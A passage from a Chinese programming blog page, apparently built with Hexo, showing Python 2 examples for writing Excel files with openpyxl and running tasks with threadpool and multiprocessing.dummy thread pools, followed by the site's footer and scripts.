<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from openpyxl import Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line">sheet = wb.active</span><br><span class="line">sheet.title = &quot;New Shit&quot;</span><br><span class="line">sheet[&apos;C3&apos;] = &apos;Hello world!&apos;</span><br><span class="line">for i in range(10):</span><br><span class="line">  sheet[&quot;A%d&quot; % (i+1)].value = i + 1</span><br><span class="line">sheet[&quot;E1&quot;].value = &quot;=SUM(A:A)&quot;</span><br><span class="line"></span><br><span class="line">wb.save(&apos;保存一个新的excel.xlsx&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="线程库-threadpool-多进程"><a href="#线程库-threadpool-多进程" class="headerlink" title="线程库 threadpool  多进程"></a>线程库 threadpool  多进程</h3><p>多线程和多进程：一个是 thread 库，一个是 multiprocessing 库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import threadpool  </span><br><span class="line">def sayhello(str):</span><br><span class="line">    print &quot;Hello &quot;,str</span><br><span class="line">    time.sleep(2)</span><br><span class="line"></span><br><span class="line">name_list =[&apos;xiaozi&apos;,&apos;aa&apos;,&apos;bb&apos;,&apos;cc&apos;]</span><br><span class="line">start_time = time.time()</span><br><span class="line">pool = threadpool.ThreadPool(10) </span><br><span class="line">requests = threadpool.makeRequests(sayhello, name_list) </span><br><span class="line">[pool.putRequest(req) for req in requests] </span><br><span class="line">pool.wait() </span><br><span class="line">print &apos;%d second&apos;% (time.time()-start_time)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pool = ThreadPool(poolsize)  </span><br><span class="line">requests = makeRequests(some_callable, list_of_args, callback)  </span><br><span class="line">[pool.putRequest(req) for req in requests]  </span><br><span class="line">pool.wait()  </span><br><span class="line">第一行定义了一个线程池，表示最多可以创建poolsize这么多线程；</span><br><span class="line"></span><br><span class="line">第二行是调用makeRequests创建了要开启多线程的函数，以及函数相关参数和回调函数，其中回调函数可以不写，default是无，也就是说makeRequests只需要2个参数就可以运行；</span><br><span class="line"></span><br><span class="line">第三行用法比较奇怪，是将所有要运行多线程的请求扔进线程池，[pool.putRequest(req) for req in requests]等同于</span><br><span class="line"></span><br><span class="line">　　for req in requests:  </span><br><span class="line"></span><br><span class="line">　　　　 pool.putRequest(req) </span><br><span class="line"></span><br><span class="line">第四行是等待所有的线程完成工作后退出。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import urllib2 </span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool </span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">    &apos;http://www.python.org&apos;, </span><br><span class="line">    &apos;http://www.python.org/about/&apos;,</span><br><span class="line">    &apos;http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html&apos;,</span><br><span class="line">    &apos;http://www.python.org/doc/&apos;,</span><br><span class="line">    &apos;http://www.python.org/download/&apos;,</span><br><span class="line">    &apos;http://www.python.org/getit/&apos;,</span><br><span class="line">    &apos;http://www.python.org/community/&apos;,</span><br><span class="line">    &apos;https://wiki.python.org/moin/&apos;,</span><br><span class="line">    &apos;http://planet.python.org/&apos;,</span><br><span class="line">    &apos;https://wiki.python.org/moin/LocalUserGroups&apos;,</span><br><span class="line">    &apos;http://www.python.org/psf/&apos;,</span><br><span class="line">    &apos;http://docs.python.org/devguide/&apos;,</span><br><span class="line">    &apos;http://www.python.org/community/awards/&apos;</span><br><span class="line">    # etc.. </span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"># Make the Pool of workers</span><br><span class="line">pool = ThreadPool(4) </span><br><span class="line"># Open the urls in their own threads</span><br><span class="line"># and return the results</span><br><span class="line">results = pool.map(urllib2.urlopen, urls)</span><br><span class="line">#close the pool and wait for the work to finish </span><br><span class="line">pool.close() </span><br><span class="line">pool.join() </span><br><span class="line">​```</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">下一页 &raquo;</a>
  </nav>

</section>
        
      </div>
      
        <div align="center" style="margin-top: 30px;"><hr class="hr" style="margin:0px; height:3px;"></div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2016 - 2018 shackle All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				访客数 : <span id="busuanzi_value_site_uv"></span> |  
				访问量 : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>


  <script src="/js/home.js"></script>










	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            shackle
          </div>
          <div class="panel-body">
            Copyright © 2018 shackle All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
</body>
</html>